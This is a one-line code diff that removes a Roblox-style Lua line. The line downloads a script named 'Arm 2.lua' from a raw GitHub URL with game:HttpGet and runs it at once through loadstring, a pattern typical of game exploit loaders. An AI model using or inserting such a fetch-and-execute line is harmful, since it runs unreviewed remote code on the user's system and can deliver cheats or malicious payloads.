@@ -1,1 +1,0 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/antipipka/roblox/main/Arm%202.lua'))()
